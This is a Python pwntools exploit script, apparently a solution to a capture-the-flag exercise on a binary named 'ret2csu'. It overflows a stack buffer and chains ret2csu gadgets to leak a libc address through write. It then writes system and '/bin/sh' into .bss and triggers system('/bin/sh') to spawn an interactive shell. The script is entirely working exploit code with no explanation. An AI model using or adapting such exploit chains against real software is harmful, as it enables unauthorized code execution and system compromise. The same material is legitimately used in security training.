
from pwn import *
from LibcSearcher import *


sh = process('./ret2csu')
elf = ELF('./ret2csu')

write_got = p64(elf.got['write'])
start_addr = p64(elf.symbols['_start'])
gadget1_addr = p64(0x400606)
gadget2_addr = p64(0x4005F0)
payload = b'a' * 136 + gadget1_addr + p64(0) + p64(0) + p64(1) + write_got + p64(1) + write_got + p64(8) + gadget2_addr + b'a'*56 + start_addr
sh.recvuntil("Hello, World\n")
sh.send(payload)
write_addr = u64(sh.recv(8))
print('send 1')

libc = LibcSearcher("write",write_addr)
libcbase = write_addr - libc.dump("write")
sys_addr = libcbase + libc.dump("system")
bin_sh_addr = libcbase + libc.dump("str_bin_sh")

read_got = p64(elf.got['read'])
bss_addr = elf.bss()
payload2 = b'a' * 136 + gadget1_addr + p64(0) + p64(0) + p64(1) + read_got + p64(0) + p64(bss_addr) + p64(16) + gadget2_addr + b'a'*56 + start_addr
sh.recvuntil("Hello, World\n")
sh.send(payload2)
sh.send(p64(sys_addr) + b'/bin/sh\00')
print('send 2')

payload3 = b'a' * 136 + gadget1_addr + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0) +p64(0) + gadget2_addr + b'a'*56 + start_addr
sh.recvuntil("Hello, World\n")
sh.send(payload3)
print('send 3')

sh.interactive()
